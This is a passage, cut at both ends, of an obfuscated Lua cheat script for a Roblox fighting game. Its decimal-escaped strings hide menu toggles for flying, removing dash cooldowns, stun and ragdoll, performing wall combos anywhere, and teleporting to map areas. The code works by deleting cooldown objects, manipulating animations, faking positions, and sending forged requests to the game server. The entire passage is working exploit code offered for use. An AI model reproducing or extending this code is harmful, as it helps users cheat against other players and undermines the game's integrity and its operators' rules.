 if (_lIIllIIlll and _lIIllIIlll.SeatPart and _lIIllIIlll.SeatPart.Velocity.Magnitude <= 0x5) or ( not (_lIIllIIlll and _lIIllIIlll.SeatPart) or tick() >= _lIIlIlllll + 0x1) then break end
 end
 end
 , }) _llllIIlllI:AddSlider("\082\101\118\101\110\097\110\116\070\108\121\083\112\101\101\100", { Text = "\070\108\121\032\083\112\101\101\100", Default = 0x2710, Min = 0x1, Max = 0xC350, Rounding = 0x1, }) _llllIIlllI:AddDivider() table.insert(_IllIllIIll, function () _lIIIllIlIl.Flying = false _llIlIIIllI() pcall( function () _llIIllIlll.RevenantFly:SetValue(false) end
 ) end
 ) end
 if _lIIIIIIllI[_llIIlIIIlI] then local _lllIlIllIl = { ["\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\052\056\048\055\057\054\048\050\049"] = true, ["\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\052\056\048\055\057\051\057\054\050"] = true, } local _lIlIlIIllI = nil local _IIllllIIIl = {} _IllIIIIIll:AddToggle("\077\049\082\101\115\101\116", { Text = "\077\049\032\082\101\115\101\116\032\047\032\078\111\032\068\097\115\104\032\068\101\098\111\117\110\099\101", Default = false, }) _lIlIlIIllI = RunService.Heartbeat:Connect( function () if not _llIIllIlll.M1Reset or not _llIIllIlll.M1Reset.Value then return end
 local _IIllIIlllI = _llIlIIlIll.Character if not _IIllIIlllI then return end
 local _IIIlllIIlI = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _IIIlllIIlI then return end
 for _lIIlIllIlI, _IlIlIlIlIl in pairs(_IIIlllIIlI:GetPlayingAnimationTracks()) do local _IIIIIIIlII = _IlIlIlIlIl.Animation and _IlIlIlIlIl.Animation.AnimationId or "" if _lllIlIllIl[_IIIIIIIlII] and not _IIllllIIIl[_IlIlIlIlIl] then _IIllllIIIl[_IlIlIlIlIl] = true task.spawn( function () local _lIIlllIlIl = _IlllIIllII.InputBegan:Once( function () while true do if _IlllIIllII:IsKeyDown(Enum.KeyCode.Q) and not _IIllIIlllI:FindFirstChild("\082\097\103\100\111\108\108\067\097\110\099\101\108") then if _IlllIIllII:IsKeyDown(Enum.KeyCode.A) or (_IlllIIllII:IsKeyDown(Enum.KeyCode.D) or _IlllIIllII:IsKeyDown(Enum.KeyCode.S)) then if workspace:GetAttribute("\078\111\068\097\115\104\067\111\111\108\100\111\119\110") then _IlIlIlIlIl:Stop() local _IIlllllIII = _IIllIIlllI local _lllIllllII, m1State, m1Index = pairs(_IIlllllIII:GetChildren()) while true do local _IIIIIlllIl m1Index, _IIIIIlllIl = _lllIllllII(m1State, m1Index) if m1Index == nil then break end
 if _IIIIIlllIl.Name == "\085\115\101\100\068\097\115\104" or _IIIIIlllIl.Name == "\070\114\101\101\122\101" then _IIIIIlllIl:Destroy() end
 end
 end
 else _IIllIIlllI.Communicate:FireServer({ Dash = Enum.KeyCode.W, Key = Enum.KeyCode.Q, Goal = "\075\101\121\080\114\101\115\115", }) end
 break end
 RunService.RenderStepped:Wait() if not _IlIlIlIlIl.IsPlaying then break end
 end
 end
 ) task.delay(0x1, function () _lIIlllIlIl:Disconnect() _IIllllIIIl[_IlIlIlIlIl] = nil end
 ) end
 ) end
 end
 for _IlIlIlIlIl, _lIIlIllIlI in pairs(_IIllllIIIl) do if not _IlIlIlIlIl.IsPlaying then _IIllllIIIl[_IlIlIlIlIl] = nil end
 end
 end
 ) table.insert(_IllIllIIll, function () if _lIlIlIIllI then _lIlIlIIllI:Disconnect() _lIlIlIIllI = nil end
 _IIllllIIIl = {} pcall( function () _llIIllIlll.M1Reset:SetValue(false) end
 ) end
 ) do local _lIllIIllll = { "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\052\056\048\055\057\054\048\050\049", "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\052\056\048\055\057\051\057\054\050", "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\052\057\049\057\057\051\054\056\050", } _IllIIIIIll:AddToggle("\069\109\111\116\101\068\097\115\104", { Text = "\069\109\111\116\101\032\068\097\115\104", Default = false, }) local _IllIllIIIl = {} local function _IllllIIIlI() local _lllIIlIIII = _llIlIIlIll.PlayerGui:WaitForChild("\069\109\111\116\101\115", 0xF) if not _lllIIlIIII then return end
 local _IllIIIIlIl = _lllIIlIIII:FindFirstChildWhichIsA("\073\109\097\103\101\076\097\098\101\108") if not _IllIIIIlIl then local _lIllIIIlIl = tick() + 0x5 repeat local _IIIlIIIlII = _lllIIlIIII.ChildAdded:Wait() if _IIIlIIIlII:IsA("\073\109\097\103\101\076\097\098\101\108") then _IllIIIIlIl = _IIIlIIIlII end
 until _IllIIIIlIl or tick() > _lIllIIIlIl end
 if not _IllIIIIlIl then return end
 local function _lIlIlIIlll(_IIIlIIIlII) local _IllllIllll = _IIIlIIIlII:FindFirstChild("\066\117\116\116\111\110") if not (_IIIlIIIlII:IsA("\070\114\097\109\101") and tonumber(_IIIlIIIlII.Name) and _IllllIllll) then return end
 local _IllIIlIllI = _IllllIllll.MouseButton1Click:Connect( function () if not _llIIllIlll.EmoteDash.Value then return end
 local _IIllIIlllI = _IIIllIllIl(_llIlIIlIll) local _lIlIIllIII = _IIllIIlllI and getHumanoid(_IIllIIlllI) if not (_IIllIIlllI and _lIlIIllIII) or _IIllIIlllI:FindFirstChild("\070\114\101\101\122\101") then return end
 local _llllllllII, pingVal = pcall( function () return game:GetService("\083\116\097\116\115").Network.ServerStatsItem["\068\097\116\097\032\080\105\110\103"]:GetValue() / 0x3E8 end
 ) task.wait(_llllllllII and pingVal / 0x2 or 0x0) for _lIIlIllIlI, _IlIlIlIlIl in pairs(_lIlIIllIII:GetPlayingAnimationTracks()) do if table.find(_lIllIIllll, _IlIlIlIlIl.Animation.AnimationId) then _IlIlIlIlIl:AdjustSpeed(0x63) end
 end
 end
 ) table.insert(_IllIllIIIl, _IllIIlIllI) end
 for _lIIlIllIlI, _IIIlIIIlII in pairs(_IllIIIIlIl:GetChildren()) do _lIlIlIIlll(_IIIlIIIlII) end
 local _IlIlIllIll = _IllIIIIlIl.ChildAdded:Connect( function (_IIIlIIIlII) _lIlIlIIlll(_IIIlIIIlII) end
 ) table.insert(_IllIllIIIl, _IlIlIllIll) end
 task.spawn(_IllllIIIlI) _llIlIIlIll.CharacterAdded:Connect( function () for _lIIlIllIlI, _IlIlIllIll in pairs(_IllIllIIIl) do _IlIlIllIll:Disconnect() end
 _IllIllIIIl = {} task.spawn(_IllllIIIlI) end
 ) table.insert(_IllIllIIll, function () for _lIIlIllIlI, _IlIlIllIll in pairs(_IllIllIIIl) do _IlIlIllIll:Disconnect() end
 _IllIllIIIl = {} pcall( function () _llIIllIlll.EmoteDash:SetValue(false) end
 ) end
 ) end
 end
 do local _lIlIlIIIIl = nil local function _llIllIlIlI() if _lIlIlIIIIl then return end
 _lIlIlIIIIl = RunService.Heartbeat:Connect( function () if not _llIIllIlll.UltMirage or not _llIIllIlll.UltMirage.Value then return end
 local _IIllIIlllI = _llIlIIlIll.Character if not _IIllIIlllI then return end
 local _lIlIIllIII = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _lIlIIllIII then return end
 if _IIllIIlllI:FindFirstChild("\070\114\101\101\122\101") or _IIllIIlllI:FindFirstChild("\065\110\116\105\077\111\118\101") then return end
 if _IIllIIlllI:GetAttribute("\082\117\110\110\105\110\103") then _lIlIIllIII.WalkSpeed = 0x20 end
 end
 ) end
 local function _lllllllIII() if _lIlIlIIIIl then _lIlIlIIIIl:Disconnect() _lIlIlIIIIl = nil end
 end
 _IllIIIIIll:AddToggle("\085\108\116\077\105\114\097\103\101", { Text = "\085\108\116\032\077\105\114\097\103\101", Default = false, Callback = function (_IIlIlIIlII) if _IIlIlIIlII then _llIllIlIlI() else _lllllllIII() end
 end
 , }) table.insert(_IllIllIIll, function () _lllllllIII() pcall( function () _llIIllIlll.UltMirage:SetValue(false) end
 ) end
 ) end
 if _lllIIllIII and _lIIIlIIIlI.Combat then _IllIIIIIll:AddDropdown("\067\104\097\114\097\099\116\101\114\069\120\112\108\111\105\116\115", { Values = { "\078\111\032\068\097\115\104\032\067\111\111\108\100\111\119\110", "\078\111\032\083\116\117\110", "\078\111\032\083\108\111\119", "\078\111\032\070\097\116\105\103\117\101", "\078\111\032\074\117\109\112\032\066\121\112\097\115\115", "\078\111\032\082\111\116\097\116\105\111\110\115\032\066\121\112\097\115\115", "\065\110\116\105\032\082\097\103\100\111\108\108", }, Default = {}, Multi = true, Searchable = false, Text = "\067\104\097\114\097\099\116\101\114\032\069\120\112\108\111\105\116\115", Callback = function (p517) workspace:SetAttribute("\078\111\068\097\115\104\067\111\111\108\100\111\119\110", false) workspace:SetAttribute("\078\111\070\097\116\105\103\117\101", false) if rawget(p517, "\078\111\032\068\097\115\104\032\067\111\111\108\100\111\119\110") then workspace:SetAttribute("\078\111\068\097\115\104\067\111\111\108\100\111\119\110", true) elseif rawget(p517, "\078\111\032\070\097\116\105\103\117\101") then workspace:SetAttribute("\078\111\070\097\116\105\103\117\101", true) elseif rawget(p517, "\078\111\032\082\111\116\097\116\105\111\110\115\032\066\121\112\097\115\115") then local _IIllIIlllI = _llIlIIlIll.Character if _IIllIIlllI then for _lIIlIllIlI, inst in pairs(_IIllIIlllI:GetDescendants()) do if inst.Name == "\078\111\082\111\116\097\116\101" or inst.Name == "\078\111\082\111\116\097\116\101\085\108\116\105\109\097\116\101" then pcall( function () inst:Destroy() end
 ) end
 end
 end
 end
 end
 , }) _IllIIIIIll:AddToggle("\065\117\116\111\082\097\103\100\111\108\108\067\097\110\099\101\108", { Text = "\065\117\116\111\032\082\097\103\100\111\108\108\032\067\097\110\099\101\108", Default = false, }) _IllIIIIIll:AddToggle("\082\097\103\100\111\108\108\072\105\100\101", { Text = "\082\097\103\100\111\108\108\032\072\105\100\101", Default = false, }) _IllIIIIIll:AddToggle("\076\097\117\110\099\104\072\105\100\101", { Text = "\076\097\117\110\099\104\032\072\105\100\101", Default = false, }) workspace:SetAttribute("\069\102\102\101\099\116\065\102\102\101\099\116\115", 0x1) local _IIlIIlllIl = false workspace.AttributeChanged:Connect( function (p518) if _IIlIIlllIl then return end
 _IIlIIlllIl = true if p518 == "\078\111\068\097\115\104\067\111\111\108\100\111\119\110" then workspace:SetAttribute(p518, rawget(_lIIlIllIlI.CharacterExploits.Value, "\078\111\032\068\097\115\104\032\067\111\111\108\100\111\119\110") and true or false) elseif p518 == "\078\111\070\097\116\105\103\117\101" then workspace:SetAttribute(p518, rawget(_lIIlIllIlI.CharacterExploits.Value, "\078\111\032\070\097\116\105\103\117\101") and true or false) elseif p518 == "\069\102\102\101\099\116\115\065\102\102\101\099\116" then workspace:SetAttribute("\069\102\102\101\099\116\065\102\102\101\099\116\115", 0x1) end
 _IIlIIlllIl = false end
 ) table.insert(_IllIllIIll, function () pcall( function () _lIIlIllIlI.CharacterExploits:SetValue({}) end
 ) pcall( function () _llIIllIlll.AutoRagdollCancel:SetValue(false) end
 ) pcall( function () _llIIllIlll.RagdollHide:SetValue(false) end
 ) pcall( function () _llIIllIlll.LaunchHide:SetValue(false) end
 ) workspace:SetAttribute("\078\111\068\097\115\104\067\111\111\108\100\111\119\110", false) workspace:SetAttribute("\078\111\070\097\116\105\103\117\101", false) end
 ) end
 if _lllIIllIII and _lIIIlIIIlI.Combat then local _lIIlIlIIll = { ["\065\116\111\109\105\099\032\083\108\097\115\104"] = CFrame.new(-0x34, 0x62C, 0x62A2) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), Arena = CFrame.new(-0x82, 0x1B8, -0x175) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), Baseplate = CFrame.new(-0x2A, 0x73F, 0x628B) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\066\101\108\111\119\032\066\097\115\101\112\108\097\116\101"] = CFrame.new(-0x2A, 0x5BD, 0x628B) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), Jail = CFrame.new(0x1B8, 0x1B8, -0x18B) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\074\097\105\108\032\066\117\116\032\083\109\097\108\108\101\114"] = CFrame.new(0x14, 0x1B7, -0x1CC) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\066\105\103\103\101\114\032\074\097\105\108"] = CFrame.new(0x122, 0x1B8, 0x1D1) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\069\118\101\110\032\066\105\103\103\101\114\032\074\097\105\108"] = CFrame.new(0x17A, 0x1B7, 0x1C9) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\068\097\114\107\032\068\111\109\097\105\110"] = CFrame.new(-0x50, 0x54, 0x4FAB) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\068\101\097\116\104\032\067\111\117\110\116\101\114"] = CFrame.new(-0x42, 0x1D, 0x4F9F) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), Middle = CFrame.new(0x9B, 0x1B9, 0x2D) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\077\111\117\110\116\097\105\110\032\049"] = CFrame.new(0x132, 0x29F, 0x19B) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\077\111\117\110\116\097\105\110\032\050"] = CFrame.new(-0x1, 0x28D, -0x162) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\077\111\117\110\116\097\105\110\032\069\100\103\101"] = CFrame.new(-0x129, 0x252, -0x150) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), Void = CFrame.new(0xA9, 0xDA, 0x66) * CFrame.new(0x0, 1.5, 0x0) * CFrame.Angles(math.rad(0x5A), 0x0, 0x0), } local _llllIIlIII = { ["\065\116\111\109\105\099\032\083\108\097\115\104"] = CFrame.new(-0x34, 0x62C, 0x62A2), Arena = CFrame.new(-0x82, 0x1B8, -0x175), Baseplate = CFrame.new(-0x2A, 0x73F, 0x628B), ["\066\101\108\111\119\032\066\097\115\101\112\108\097\116\101"] = CFrame.new(-0x2A, 0x5BD, 0x628B), Jail = CFrame.new(0x1B8, 0x1B8, -0x18B), ["\074\097\105\108\032\066\117\116\032\083\109\097\108\108\101\114"] = CFrame.new(0x14, 0x1B7, -0x1CC), ["\066\105\103\103\101\114\032\074\097\105\108"] = CFrame.new(0x122, 0x1B8, 0x1D1), ["\069\118\101\110\032\066\105\103\103\101\114\032\074\097\105\108"] = CFrame.new(0x17A, 0x1B7, 0x1C9), ["\068\097\114\107\032\068\111\109\097\105\110"] = CFrame.new(-0x50, 0x54, 0x4FAB), ["\068\101\097\116\104\032\067\111\117\110\116\101\114"] = CFrame.new(-0x42, 0x1D, 0x4F9F), Middle = CFrame.new(0x96, 0x1B9, 0x20), ["\077\111\117\110\116\097\105\110\032\049"] = CFrame.new(0x9, 0x28D, -0x16B), ["\077\111\117\110\116\097\105\110\032\050"] = CFrame.new(-0x1, 0x28D, -0x162), ["\077\111\117\110\116\097\105\110\032\069\100\103\101"] = CFrame.new(-0x129, 0x252, -0x150), Void = CFrame.new(0x0, -0x2710, 0x0), } local _lIIIIIIllI = {} for _llIlIIIllI in pairs(_lIIlIlIIll) do _lIIIIIIllI[#_lIIIIIIllI+0x1] = _llIlIIIllI end
 table.sort(_lIIIIIIllI) local _IllIlIIllI = _llllIIlIII.Middle local _llIIllllIl = false local _IIlIIlIIll = nil local function _llIlIlllIl(_IlIIIIIlII) local _IIllIIlllI = _llIlIIlIll.Character local _lIlIllIlIl = _IIllIIlllI and _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not (_IIllIIlllI and _lIlIllIlIl) then return end
 RunService.Heartbeat:Once( function () _lIlIllIlIl.CFrame = _IlIIIIIlII end
 ) end
 local function _IIlIIIIlll(_IIIlllIIlI, _IIIIIIIlII) local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\048\057\051\051\053\055\056\056\057\057\048\052\050" local _IlIlIlIlIl = _IIIlllIIlI:LoadAnimation(_IlIllllIlI) _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IIIIIIIlII return _IlIlIlIlIl end
 local function _lIIlllIlII() if getgenv()._wcDashOnCooldown then return true end
 if _llIIllIlll.KibaTech and _llIIllIlll.KibaTech.Value then return false end
 if _llIIllIlll.SupaTech and _llIIllIlll.SupaTech.Value then return false end
 if _llIIllIlll.LoopDashV2 and _llIIllIlll.LoopDashV2.Value then return false end
 if _llIIllIlll.InstantTwisted and _llIIllIlll.InstantTwisted.Value then local _IIllIlIlII = tostring(_llIlIIlIll:GetAttribute("\067\104\097\114\097\099\116\101\114") or ""):lower() if _IIllIlIlII:find("\103\097\114\111\117") or _IIllIlIlII:find("\104\117\110\116\101\114") or _IIllIlIlII:find("\099\104\105\108\100") then return false end
 end
 return true end
 local function _lIllIllIlI(_IIllIIlllI) if not _IIllIIlllI then return end
 local _lIlIllIlIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116", 0x3) local _IIIlllIIlI = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100", 0x3) if not _lIlIllIlIl or not _IIIlllIIlI then return end
 _IIllIIlllI.AttributeChanged:Connect( function (_lIIlIIlIII) if _lIIlIIlIII ~= "\067\111\109\098\111" then return end
 if _IIllIIlllI:GetAttribute("\067\111\109\098\111") ~= 0x5 then return end
 if not _llIIllIlll.WallComboAnywhere.Value then return end
 local _lIIIllIlll = _lIIlIllIlI.AutoWallCombo.Value if _llIIllllIl then return end
 task.spawn( function () task.wait() local _lIIlllIlll = false pcall( function () for _lIIlIllIlI, _lIIIllllII in pairs(_IIIlllIIlI:GetPlayingAnimationTracks()) do if _lIIIllllII.Animation and _lIIIllllII.Animation.AnimationId:match("\049\048\052\055\048\049\048\052\050\052\050") then _lIIlllIlll = true break end
 end
 end
 ) local _llllIlIIII = false pcall( function () local _llIllllIII = { "\049\048\052\054\057\054\052\051\054\052\051", "\049\051\050\057\052\052\055\049\057\054\054", "\049\055\056\056\057\050\057\048\053\054\057", "\049\051\050\057\053\057\051\054\056\054\054", "\049\051\051\055\056\055\048\056\049\057\057", "\049\052\049\051\054\052\051\054\049\053\055", "\049\053\049\054\050\054\057\052\049\057\050", "\049\054\053\053\050\050\051\052\053\057\048", "\049\055\051\050\053\053\051\055\055\049\057", "\049\051\052\055\055\053\052\048\054\052\051\055\054\050\054", "\056\048\054\048\049\050\051\057\049\051\057\055\055\052", } for _lIIlIllIlI, _lIIIllllII in pairs(_IIIlllIIlI:GetPlayingAnimationTracks()) do if _lIIIllllII.Animation then local _IlIIIllllI = _lIIIllllII.Animation.AnimationId:match("\037\100\043") or "" for _lIIlIllIlI, m4id in ipairs(_llIllllIII) do if _IlIIIllllI == m4id then _llllIlIIII = true; break end
 end
 end
 if _llllIlIIII then break end
 end
 end
 ) if _llllIlIIII then local _lIIllllIlI = tostring(_llIlIIlIll:GetAttribute("\067\104\097\114\097\099\116\101\114") or ""):lower() local _llIIIIIlIl = _lIIllllIlI:find("\103\097\114\111\117") or _lIIllllIlI:find("\104\117\110\116\101\114") or _lIIllllIlI:find("\109\111\110\115\116\101\114") or _lIIllllIlI:find("\099\104\105\108\100") or _lIIllllIlI:find("\116\101\099\104") if _llIIIIIlIl and _llIIllIlll.InstantTwisted and _llIIllIlll.InstantTwisted.Value then _llllIlIIII = false end
 end
 if not _lIIlllIlll and not _llllIlIIII and not _lIIlllIlII() then return end
 if _lIIIllIlll == "\065\117\116\111\032\087\097\108\108\032\067\111\109\098\111\032\043\032\066\114\105\110\103" then _llIIllllIl = true local _lIIIllllII = tick() repeat getgenv().flingDesync = { CFrame = _lIlIllIlIl.CFrame * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), } task.wait() until tick() >= _lIIIllllII + 0.225 local _lIIIIIlllI = _lIlIllIlIl.CFrame getgenv().flingDesync = { CFrame = _lIIlIlIIll[_lIIlIllIlI.AutoWallComboArea.Value], } task.wait(0.2) pcall( function () _IIllIIlllI.Communicate:FireServer({ Goal = "\087\097\108\108\032\067\111\109\098\111" }) end
 ) getgenv().flingDesync = nil _llIIllllIl = false task.wait(0.5) if _IIllIIlllI:FindFirstChild("\070\111\114\099\101\070\105\101\108\100") and _llIIllIlll.AutoWallComboTPBack.Value then pcall( function () for _lIIlIllIlI, _IlIlIlIlIl in pairs(_IIIlllIIlI:GetPlayingAnimationTracks()) do _IlIlIlIlIl:Stop() end
 end
 ) _llIlIlllIl(_lIIIIIlllI) end
 else _llIIllllIl = true local _llIllIllII = nil if not getgenv().InvisActive and not getgenv().FUCActive then local _IlIlIlIlIl = _IIlIIIIlll(_IIIlllIIlI, "\049\056\049\053\050\053\053\052\054") _IlIlIlIlIl.Priority = Enum.AnimationPriority.Action3 task.delay(0.1, function () _IlIlIlIlIl:Play() _IlIlIlIlIl.TimePosition = 0x1 _IlIlIlIlIl:AdjustWeight(0xF423F) _IlIlIlIlIl:AdjustSpeed(0x0) end
 ) _llIllIllII = _IlIlIlIlIl end
 local _lIIIllllII = tick() repeat getgenv().flingDesync = { CFrame = _lIlIllIlIl.CFrame * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), } task.wait() until tick() >= _lIIIllllII + 0.6 getgenv().flingDesync = nil _llIIllllIl = false task.delay(0.1, function () if _llIllIllII then pcall( function () _llIllIllII:Stop() end
 ) end
 end
 ) end
 end
 ) end
 ) _IIllIIlllI.DescendantAdded:Connect( function (obj) if not (obj:IsA("\079\098\106\101\099\116\086\097\108\117\101") and obj.Name:lower() == "\119\097\108\108\099\111\109\098\111") then return end
 if not _llIIllIlll.WallComboAnywhere.Value then return end
 local _lllIIIIlIl = tick() while true do if _lIIlIllIlI.AutoWallCombo.Value == "\065\117\116\111\032\087\097\108\108\032\067\111\109\098\111" then pcall( function () _IIllIIlllI.Communicate:FireServer({ Goal = "\087\097\108\108\032\067\111\109\098\111" }) end
 ) end
 task.wait() if obj.Parent ~= _IIllIIlllI or tick() >= _lllIIIIlIl + (obj:GetAttribute("\068\101\108\101\116\101\077\101") or 0.6) then break end
 end
 end
 ) end
 _lIllIllIlI(_llIlIIlIll.Character) _IIlIIlIIll = _llIlIIlIll.CharacterAdded:Connect( function (_IIllIIlllI) task.wait(0.1) _lIllIllIlI(_IIllIIlllI) end
 ) table.insert(_IllIllIIll, function () getgenv().flingDesync = nil _llIIllllIl = false if _IIlIIlIIll then _IIlIIlIIll:Disconnect() _IIlIIlIIll = nil end
 pcall( function () _llIIllIlll.WallComboAnywhere:SetValue(false) end
 ) pcall( function () _lIIlIllIlI.AutoWallCombo:SetValue("\077\097\110\117\097\108") end
 ) pcall( function () _llIIllIlll.AutoWallComboTPBack:SetValue(false) end
 ) end
 ) local _IllIIIlIll = _IIIlIIIIII _IllIIIlIll:AddToggle("\087\097\108\108\067\111\109\098\111\065\110\121\119\104\101\114\101", { Text = "\087\097\108\108\032\067\111\109\098\111\032\065\110\121\119\104\101\114\101", Default = false, }) _IllIIIlIll:AddDropdown("\065\117\116\111\087\097\108\108\067\111\109\098\111", { Text = "\065\117\116\111\032\087\097\108\108\032\067\111\109\098\111", Values = { "\077\097\110\117\097\108", "\065\117\116\111\032\087\097\108\108\032\067\111\109\098\111", "\065\117\116\111\032\087\097\108\108\032\067\111\109\098\111\032\043\032\066\114\105\110\103" }, Multi = false, Default = 0x1, }) _IllIIIlIll:AddToggle("\065\117\116\111\087\097\108\108\067\111\109\098\111\084\080\066\097\099\107", { Text = "\084\101\108\101\112\111\114\116\032\066\097\099\107", Default = false, }) _IllIIIlIll:AddDropdown("\065\117\116\111\087\097\108\108\067\111\109\098\111\065\114\101\097", { Text = "\065\114\101\097", Values = _lIIIIIIllI, Multi = false, Default = table.find(_lIIIIIIllI, "\068\101\097\116\104\032\067\111\117\110\116\101\114"), Searchable = true, }) _IllIIIlIll:AddButton({ Text = "\084\101\108\101\112\111\114\116\032\084\111\032\065\114\101\097", Func = function () local _IlIIIIIlII = _llllIIlIII[_lIIlIllIlI.AutoWallComboArea.Value] if not _IlIIIIIlII then return end
 local _IIllIIlllI = _llIlIIlIll.Character local _lIlIllIlIl = _IIllIIlllI and _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIllIIlllI and _lIlIllIlIl then local _lllIIllIII = (_llllIIlIII.Middle.Position - _IlIIIIIlII.Position).Magnitude if _lllIIllIII >= 0x64 then _IllIlIIllI = _lIlIllIlIl.CFrame end
 end
 _llIlIlllIl(_IlIIIIIlII) end
 , }) _IllIIIlIll:AddButton({ Text = "\084\101\108\101\112\111\114\116\032\066\097\099\107", Func = function () _llIlIlllIl(_IllIlIIllI) end
 , }) end
 if _lIIIIIIllI[_llIIlIIIlI] then local _IIlIIlIlIl = _IIIIIlIlIl _IIlIIlIlIl:AddToggle("\084\114\097\115\104\099\097\110\076\097\117\110\099\104", { Text = "\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104", Default = false, }) _IIlIIlIlIl:AddSlider("\084\114\097\115\104\099\097\110\095\076\097\117\110\099\104\080\111\119\101\114", { Text = "\076\097\117\110\099\104\032\080\111\119\101\114", Default = 0x64, Min = 0x1, Max = 0x9C4, Rounding = 0x1, Compact = true, }) end
 if _lIIIIIIllI[_llIIlIIIlI] and _lIIIlIIIlI.Combat then local _llIIIIIllI = { ["\065\098\111\118\101\032\084\117\110\110\101\108"] = CFrame.new(-0x12D, 0x252, -0x142), Arena = CFrame.new(-0x82, 0x1B8, -0x175), ["\065\116\111\109\105\099\032\083\108\097\115\104"] = CFrame.new(-0x34, 0x62C, 0x62A2), Baseplate = CFrame.new(-0x2A, 0x73F, 0x628B), ["\066\101\108\111\119\032\066\097\115\101\112\108\097\116\101"] = CFrame.new(-0x2A, 0x5BD, 0x628B), ["\066\105\103\103\101\114\032\074\097\105\108"] = CFrame.new(0x122, 0x1B8, 0x1D1), ["\066\108\097\099\107\032\068\111\109\097\105\110"] = CFrame.new(0xE8D4A51000, 0x5F5E100, 0x174876E800), ["\069\118\101\110\032\066\105\103\103\101\114\032\074\097\105\108"] = CFrame.new(0x17A, 0x1B7, 0x1C9), ["\068\097\114\107\032\068\111\109\097\105\110"] = CFrame.new(-0x50, 0x54, 0x4FAB), ["\068\101\097\116\104\032\067\111\117\110\116\101\114"] = CFrame.new(-0x42, 0x1D, 0x4F9F), Jail = CFrame.new(0x1B8, 0x1B8, -0x18B), ["\074\097\105\108\032\066\117\116\032\083\109\097\108\108\101\114"] = CFrame.new(0x14, 0x1B7, -0x1CC), Middle = CFrame.new(0x96, 0x1B9, 0x20), ["\077\111\117\110\116\097\105\110\032\049"] = CFrame.new(0x132, 0x29F, 0x19B), ["\077\111\117\110\116\097\105\110\032\050"] = CFrame.new(-0x1, 0x28D, -0x162), ["\077\111\117\110\116\097\105\110\032\069\100\103\101"] = CFrame.new(-0x129, 0x252, -0x150), Void = CFrame.new(0x0, -0x2710, 0x0), } local _lIIIIIlIll = {} for _llIlIIIllI in pairs(_llIIIIIllI) do _lIIIIIlIll[#_lIIIIIlIll+0x1] = _llIlIIIllI end
 table.sort(_lIIIIIlIll) local _llIIIlllIl = _llIIIIIllI.Middle local _IIllIIlIlI = nil local _llIlIIlIII = false local function _lIllllIIIl(_IlIIIIIlII) local _IIllIIlllI = _llIlIIlIll.Character local _lIlIllIlIl = _IIllIIlllI and _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not (_IIllIIlllI and _lIlIllIlIl) then return end
 RunService.Heartbeat:Once( function () _lIlIllIlIl.CFrame = _IlIIIIIlII end
 ) end
 local function _lIIlIIIIlI(_IIllIIlllI) if not _IIllIIlllI then return end
 local _IIIlllIIlI = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100", 0x3) local _lIlIllIlIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116", 0x3) if not _IIIlllIIlI or not _lIlIllIlIl then return end
 _IIIlllIIlI.AnimationPlayed:Connect( function (_IlIlIlIlIl) if not _llIIllIlll.SkillBring.Value then return end
